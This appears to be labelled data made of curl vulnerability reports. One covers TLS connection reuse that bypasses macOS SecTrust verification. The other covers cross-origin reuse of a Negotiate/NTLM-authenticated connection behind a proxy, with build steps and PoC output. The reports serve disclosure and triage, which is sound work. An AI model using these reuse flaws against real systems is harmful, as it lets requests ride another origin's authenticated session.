Transfer A (explicit `CURLOPT_CAINFO` = `CURL_CA_BUNDLE` path): `custom_cafile=TRUE`, auto-setting prevented, `native_ca_store=FALSE` — OpenSSL-only verification.

Transfer B (no `CURLOPT_CAINFO`): auto-fill sets same `CAfile`, `custom_cafile=FALSE`, auto `native_ca_store=TRUE` — intended SecTrust verification.

`match_ssl_primary_config` sees matching `CAfile` + `ssl_options` → connection reused. B inherits A's connection without SecTrust ever running.

## Reproduction

macOS baremetal (`poc-native-ca.c`), built with `-DUSE_APPLE_SECTRUST=ON -DCURL_CA_BUNDLE=<path> -DCURL_USE_OPENSSL=ON`:

1. Transfer A: explicit `CURLOPT_CAINFO` = `CURL_CA_BUNDLE` path → OpenSSL verifies
2. Transfer B: no `CAINFO` → auto-fill, auto `native_ca_store=TRUE` → should use SecTrust
3. Observe: `"Reusing existing https: connection"` — SecTrust never runs

## Root cause trace

1. `Curl_ssl_easy_config_complete()` (line 258): `!custom_capath && !custom_cafile && !custom_cablob` → `native_ca_store = TRUE`. Does NOT modify `ssl_options`.
2. `CURL_CA_BUNDLE` auto-fill (line 269): sets `STRING_SSL_CAFILE` → `primary.CAfile` = bundle path.
3. Transfer A explicitly sets `CURLOPT_CAINFO` to the same path → `custom_cafile=TRUE`, auto-setting prevented, `native_ca_store=FALSE`. Same `primary.CAfile`, same `ssl_options=0`.
4. `match_ssl_primary_config` matches all fields → connection reused. `native_ca_store` not compared.

## Remediation

Move `native_ca_store` into `ssl_primary_config` so `match_ssl_primary_config()` compares it. Or add an explicit check in `Curl_ssl_conn_config_match()`.

## Impact

A transfer expecting SecTrust verification silently inherits an OpenSSL-only verified connection (or vice versa). Certificates trusted by one policy but not the other pass without re-verification.
label: real

title: CVE-2026-87861: cross-origin reuse of a Negotiate connection
body:
## Summary:
I found a cross-origin connection reuse flaw in `lib/url.c`, introduced by [bd10924b4](https://github.com/curl/curl/commit/bd10924b4) as part of the recently announced "Patch the Planet" initiative. It causes a request for one origin to be sent on a connection that was authenticated with Negotiate for a different origin, while the requesting transfer's own credentials go unused.

My research looked at the reuse matchers that [bd10924b4](https://github.com/curl/curl/commit/bd10924b4) rewrote. The commit closed [#22040](https://github.com/curl/curl/pull/22040) by adding `conn->creds_origin` and comparing it against `data->state.origin`. This activity is correct, but the issue is in the branch the commit replaced. At the parent [c2b050e4e496](https://github.com/curl/curl/commit/c2b050e4e496), the credential mismatch branch of `url_match_auth_ntlm` recorded a connection as a reuse candidate only when both auth states were idle:

```c
#ifdef USE_SPNEGO
      if((conn->http_ntlm_state == NTLMSTATE_NONE) &&
         (conn->http_negotiate_state == GSS_AUTHNONE)) {
#else
      if(conn->http_ntlm_state == NTLMSTATE_NONE) {
#endif
        m->found = conn;
      }
```

[bd10924b4](https://github.com/curl/curl/commit/bd10924b4) replaced that entire branch with a single early return gated on `conn->creds`, so the `GSS_AUTHNONE` condition is gone. That gate does not fire in the ordinary Kerberos SSO case. `Curl_http_output_auth` exempts Negotiate from the no-credentials early out, so `--negotiate` with no `-u` runs from the ticket cache with `data->state.creds` `NULL`, and `Curl_input_negotiate` links `conn->creds_origin` to the origin while `Curl_creds_link(&conn->creds, NULL)` leaves `conn->creds` `NULL`. A later transfer whose wanted auth includes `NTLM` (`CURLAUTH_ANY` masks off only `CURLAUTH_DIGEST_IE` and `CURLAUTH_HTTPSIG`, so `--anyauth` qualifies) then passes `url_match_auth`, because `needle->creds` is `NULL` for HTTP and `Curl_creds_same(NULL, NULL)` is `TRUE`. 

It reaches the state-NONE branch at `url.c:937`, where the origin comparison is gated on `conn->creds` and does not run. Control falls through to `url.c:962`, which sets `m->found = conn` and returns `FALSE` because the NTLM state is idle. `url_match_conn` returns `FALSE` on that, so `url_match_auth_nego`, the only matcher that compares the two origins, never runs, and `url_match_result` attaches `match->found` when no better candidate was found. Both origins need to sit behind one forwarding proxy, which `lib/proxy.c` arranges by setting `conn->origin` to the proxy peer, putting every origin behind that proxy in a single cpool bundle.

## Affected version
curl 8.21.0-DEV (Darwin) libcurl/8.21.0-DEV OpenSSL/3.6.3 mit-krb5/1.7-prerelease OpenLDAP/2.4.28/Apple
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS GSS-API HSTS HTTPS-proxy IPv6 Kerberos Largefile NTLM SPNEGO SSL threadsafe TLS-SRP UnixSockets

## Steps To Reproduce:
Requires git, cmake, a C compiler, OpenSSL, MIT Kerberos and uv.

1. Build curl at the affected commit.

```bash
git clone https://github.com/curl/curl.git curl-src
cd curl-src && git checkout bd10924b47c8bf94127eaee8c56e7b5e5418da46
cmake -S . -B bld \
  -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DBUILD_CURL_EXE=ON \
  -DCURL_USE_OPENSSL=ON -DCURL_USE_GSSAPI=ON -DCURL_ENABLE_NTLM=ON \
  -DCURL_USE_LIBPSL=OFF -DUSE_LIBIDN2=OFF -DUSE_NGHTTP2=OFF \
  -DCURL_ZLIB=OFF -DCURL_BROTLI=OFF -DCURL_ZSTD=OFF -DENABLE_CURL_MANUAL=OFF
cmake --build bld -j8 --target curl

./bld/src/curl -V must list SPNEGO and NTLM in Features.
```

2. Unpack the archive and point it at that binary.

```bash
unzip curl-22040-ntlm-connection-reuse.zip
cd curl-22040-ntlm-connection-reuse/pocs/ntlm-cross-origin-reuse
export CURL_BIN=/path/to/curl-src/bld/src/curl
./run.sh

Result at bd10924b4:

  conn  origin        Authorization       status
  1     a.internal    NTLM type1          401
  1     b.internal    NTLM type3          200

RESULT: REUSED ACROSS ORIGINS
```

One connection sends the type1 for a.internal, takes that origin's challenge, then sends the type3 on a request for b.internal.

## Impact

## Summary:
A request for one origin is sent on a connection that was already authenticated with Negotiate for a different origin, so the second host sees the first host's authenticated session and the requesting transfer's own credentials go unused. Both origins have to sit behind one forwarding proxy, which is what places them in a single connection bundle, so the realistic setting is an application doing Kerberos SSO across internal hosts through a corporate proxy. The result is that a request meant for host B is attributed to the caller's identity on host A, with no credential check having run on the reuse path.
label: real
